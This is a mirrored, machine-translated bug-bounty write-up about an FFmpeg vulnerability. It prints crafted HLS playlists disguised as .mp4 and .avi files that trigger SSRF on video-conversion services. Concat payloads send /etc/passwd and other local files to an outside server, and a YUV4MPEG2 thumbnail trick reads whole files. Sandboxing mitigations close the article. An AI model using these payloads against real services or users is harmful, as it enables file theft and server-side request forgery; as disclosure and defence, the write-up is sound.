@@ -1,0 +1,134 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134931760-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Dangerous video: how I found a vulnerability in video hosting and did not die after 7 days</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="Hello! I'm Maxim Andreev, programmer for the backend of Mail.Ru Cloud. In my free time I like to search for bugs. In today's post, I want to tell you ...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({
+            google_ad_client: "ca-pub-6974184241884155",
+            enable_page_level_ads: true
+       });
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
+    <div class="page-header-text">Geekly Articles each Day</div>
+  </header>
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="../../search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
+  <section class="page js-page"><h1>Dangerous video: how I found a vulnerability in video hosting and did not die after 7 days</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/756/9da/20a/7569da20abba3a0d1755c8f1e2d1677a.jpg"><br><br>  Hello!  I'm Maxim Andreev, programmer for the backend of Mail.Ru Cloud.  In my free time I like to search for bugs.  In today's post, I want to tell you about one rather interesting vulnerability that I found and fixed in bug bounty of several large companies, for which I received a solid reward.  The vulnerability is as follows: if you create a special video file and upload it to the server, then: <br><br><ul><li>  can get SSRF on it; </li><li>  can get local file read; </li><li>  if the user downloads this file, it will automatically be exposed to vulnerabilities, even if it does not open: you can access the data on the user's computer and find out his name. </li></ul><br><a name="habracut"></a><br><h1>  Technical Foreword </h1><br><img src="https://habrastorage.org/files/77a/61f/9b2/77a61f9b2fd241e690057f9b16f77604.png">
+      <br>
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <ins class="adsbygoogle"
+          style="display:block; text-align:center;"
+          data-ad-layout="in-article"
+          data-ad-format="fluid"
+          data-ad-client="ca-pub-6974184241884155"
+          data-ad-slot="8945601208"></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      <br>
+      There are a huge number of codecs, video and audio formats, but sometimes you need to get something specific, skipping all this set through some black box.  For example, we may need to output MP4-video with a given quality or JPEG-preview.  Quite often, this black box becomes <a href="https://www.ffmpeg.org/">FFmpeg</a> .  This open source set of libraries and binary utilities, it is actively developed, supports a large number of audio and video codecs, so it is often used to convert video and generate thumbnails, both as a separate tool and as separate libraries used by third-party applications.  Most large companies run FFmpeg with a command from a script or some kind of binary to fork-exec.  It so happened that it is simpler to fork from a binary and execute an FFmpeg binary than to fence it all using libraries. <br><br><h1>  Creating a malicious file </h1><br>  FFmpeg includes a console utility, ffmpeg.  Create a file test.avi, which is really an avi file, and copy it with two other extensions: .mov and .123.  If you ask ffmpeg to convert any of these files, it will do everything without any problems, that is, it will not pay attention to the file extension.  But there is one important exception, which was very useful to me in the implementation of one of the attacks described later, but more on that later. <br><br>  There is a video format like HLS (HTTP Live Streaming).  It was developed by Apple for streaming video.  This format supports such a pleasant thing as adaptive streaming, that is, a change in quality during playback.  But for us here it is important that the format consists of the so-called main playlist, which lists several other playlists with some given quality, and already in these playlists, pieces of video are listed. <br><br><img src="https://habrastorage.org/files/200/d75/643/200d756439434b288d7a0e5a30d2042c.png"><br><br>  Create a file test.mp4, which is actually the m3u8 HLS playlist: <br><br><pre><code class="html hljs xml">#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, http://www.example.org/1.mp4 #EXT-X-ENDLIST</code> </pre> <br>  He has a title, there is an ending and a link on which you need to take a piece of video.  As we already know, it is not necessary to assign the extension .m3u8, the file may be called test.mp4 or test.mov - ffmpeg will still understand that this is a m3u8 playlist, and will interpret it exactly as a playlist.  If we run our test.mp4 through any of the many millions of sites to convert online video, ffmpeg, which is used by this online converter, interprets the file as a playlist, will follow the link specified in it and on our server we will see a GET request from this online converter IP: <br><br><img src="https://habrastorage.org/files/eeb/7ce/5bb/eeb7ce5bbd424facacaf674bf4f3fddb.png"><br>  <i>Request from one of the online converters to our server</i> <br><br>  That is, at the moment we already have a simple SSRF, however, until we can read the answer. <br><br>  Let's go further.  I mentioned an important exception related to file extensions.  We offer ffmpeg to convert the text file file.txt to the out.mp4 video file.  What do you think will happen in this case?  In the file out.mp4 there will be a video in which this text file will be played just by running lines!  It turns out that we can already steal any txt-files from these online conversion services.  But this is not very interesting to us.  Let's move on. <br><br>  But what if we add to the http url at the end in the GET-parameter .txt?  It turns out that ffmpeg will think that this is a text file and that the response should be interpreted as txt.  Here is an example request for mail.ru: <br><br><pre> <code class="html hljs xml">#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, http://www.mail.ru/?.txt #EXT-X-ENDLIST</code> </pre><br><img src="https://habrastorage.org/files/17f/465/6e9/17f4656e97fa4b0c8faf3147e489c398.gif"><br><br>  The HTML code from the answer is played in the received video!  That is, in this case, we were able to read the response to any network requests using this SSRF. <br><br>  Moving on.  FFmpeg supports a huge number of different protocols, including concat.  According to the documentation, this protocol reads a binary data stream from several sources, sticks together and further interprets them as if they were from the same source. <br><br>  Let's take an example.  Suppose we have a file header.m3u8, such an unfinished playlist, which says “example.org?”.  Let's make FFmpeg, after submitting test.avi to it using the concat protocol, form a clever m3u8, containing file: /// etc / passwd, and send it to our example.org server: <br><br>  <i>file hosted on <a href="">dx.su/header.m3u8</a> :</i> <br><pre> <code class="html hljs xml">#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:, http://example.org?</code> </pre><br>  <i>test.avi:</i> <br><pre> <code class="html hljs xml">#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://dx.su/header.m3u8|file:///etc/passwd #EXT-X-ENDLIST</code> </pre><br>  ↓ <br><br><pre> <code class="html hljs xml">http://example.org?# $FreeBSD: release/10.0.0/et..</code> </pre><br>  FFmpeg, getting test.avi, will take header.m3u8 and open it as example.org, and from file: /// etc / passwd will take the first line, construct a URL and follow it.  Thus, we can get the first line of absolutely any local file that will be transferred via HTTP to our server, if we control example.org.  There is a small trick that allows us not only to steal the first line, but also to read the entire file line by line - another protocol called subfile.  I will not describe it here, but if you are interested, look at the documentation, there is nothing complicated there. <br><br>  Consider another way to steal the entire file.  We use the same technique with concat and take the title of the video format YUV4MPEG2.  This is an uncompressed format with a simple text header.  Any data stream in this file is interpreted as 8 bits per 1 pixel, that is, 1 byte per 1 pixel.  Take video.mp4, in which there will be a soncat of this header and file: /// etc / passwd.  Imagine that we uploaded it to some kind of cloud video service.  Most likely, you will see a thumbnail.  And for its generation, most likely, FFmpeg will also be used somehow. <br><br>  For the sake of simplicity, we’ll assume that we have a thumbnail in PNG format, that is, lossless compression.  Ask ffmpeg to make a thumbnail of the supposedly MP4 video video.mp4, which is actually a tricky m3u8 playlist: <br><br>  <i>header.y4m file:</i> <br><pre> <code class="html hljs xml">YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono FRAME</code> </pre><br>  <i>video.mp4 file:</i> <br><pre> <code class="html hljs xml">#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://dx.su/header.y4m|file:///etc/passwd #EXT-X-ENDLIST</code> </pre><br><br><pre> <code class="html hljs xml">ffmpeg -i video.mp4 thumbnail.png</code> </pre><br><img src="https://habrastorage.org/files/556/e07/185/556e0718517d4a4e8f8132c7f79548dd.jpg"><br>  <i>thumbnail.png</i> <br><br>  And now the resulting thumbnail is decoded back: <br><br><pre> <code class="html hljs xml">ffmpeg -i thumbnail.png out.y4m</code> </pre><br>  <i>file out.y4m:</i> <br><pre> <code class="html hljs xml">YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono FRAME # $FreeBSD: release/10.0.0/etc/master.passwd 256366 ,! 2013-10-12 06:08:18Z rpaulo $ # root:*:0:0:Charlie &amp;:/root:/usr/local/bin/zsh toor:*:0:0:Bourne-again Superuser:/root: …</code> </pre><br>  We can see the header that was in header.y4m, and in the future - the full text file: /// etc / passwd. <br><br>  Suppose we again generated our malicious file with the correct header, did the concat trick, used file: /// etc / passwd.  Only now we don’t upload the file to some service, but just give it to the user so that he downloads it and doesn’t even launch it.  If you use, say, Kali Linux, then while the thumbnail is generated, GStreamer will transfer the full path of this file to our server in the referrer.  So we can find out the username and any other non-public information.  And in the case of Ubuntu, FFmpeg will pass us the first line file: /// etc / passwd to the user who just downloaded the file. <br><br><img src="https://habrastorage.org/files/cbc/d46/77e/cbcd4677e0eb48fcb04498c3d3d1f8bd.png"><br>  <i>Request from Kali Linux</i> <br><br><img src="https://habrastorage.org/files/f2f/5ea/bbb/f2f5eabbb58a4018910adfbb7f101761.png"><br>  <i>Request from Ubuntu Linux</i> <br><br><h1>  Finally </h1><br>  Using this specially constructed video file, you can first simply make SSRF requests without reading the answer, read the answer to any network requests, read local files, and in several ways.  And what's more, we can even send this attack against ordinary users who just downloaded the file, and not against the servers. <br><br>  By the way, I talked about this vulnerability at the last <a href="http://habrahabr.ru/company/mailru/blog/270077/">Security Meetup</a> - now they regularly run in our Mail.Ru Group.  If you want to take part in one of the following and you have something to tell, write about it to me, Karim <a href="http://habrahabr.ru/users/valievkarim/" class="user_link">valievkarim</a> Valiev or Vladimir <a href="http://habrahabr.ru/users/z3apa3a/" class="user_link">z3apa3a</a> Dubrovin. <br><br>  <b>UPD:</b> How to protect yourself from the problem when encoding video on the server using ffmpeg: <br><br><ol><li>  Running ffmpeg in an isolated environment (in a chroot or in a container) is mandatory, given that ffmpeg potentially contains many vulnerabilities, regardless of the problem described in this article (see <a href="https://googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand-fixes.html">googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand- fixes.html</a> ). </li><li>  Run ffmpeg inside this environment from under a separate user with write / read access only where needed. </li><li>  Disable (--disable-network in configure) or restrict (in iptables, you can make rules according to the user's uid) access to the ffmpeg network if it cannot be completely disconnected. </li></ol><br>  The developers of ffmpeg / libav are notified of the problem, I made and sent them a patch. </div><p>Source: <a href="https://habr.com/ru/post/274855/">https://habr.com/ru/post/274855/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../274843/index.html">“Stupid” watches on FPGA</a></li>
+<li><a href="../274847/index.html">Digital filtering on FPGA - Part 2</a></li>
+<li><a href="../274849/index.html">How we started production, or my software development experience for a Siemens Simatic PLC</a></li>
+<li><a href="../274851/index.html">Mikhail Romanovich Shura-Bura - the patriarch of domestic programming and its development</a></li>
+<li><a href="../274853/index.html">Community DevCamp reports are available.</a></li>
+<li><a href="../274857/index.html">New in Wolfram Language | Analytical solution of partial differential equations</a></li>
+<li><a href="../274859/index.html">Implementing a list of used libraries using DialogFragment in Android application</a></li>
+<li><a href="../274863/index.html">Checking IronPython and IronRuby with PVS-Studio</a></li>
+<li><a href="../274865/index.html">Sir Charles Anthony Richard Hoare or just Dad Quicksort, NULL and Problems of Dining Philosophers</a></li>
+<li><a href="../274867/index.html">As I wrote the web app angular + material and REST on Yii2 + webserver nginx</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52496797 = new Ya.Metrika({
+                  id:52496797,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+  <footer class="page-footer">
+    <div class="page-footer-legal-info-container page-footer-element">
+      <p>
+        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+      </p>
+    </div>
+    <div class="page-footer-counters-container page-footer-element">
+      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
+    </div>
+  </footer>
+</body>
+
+</html>
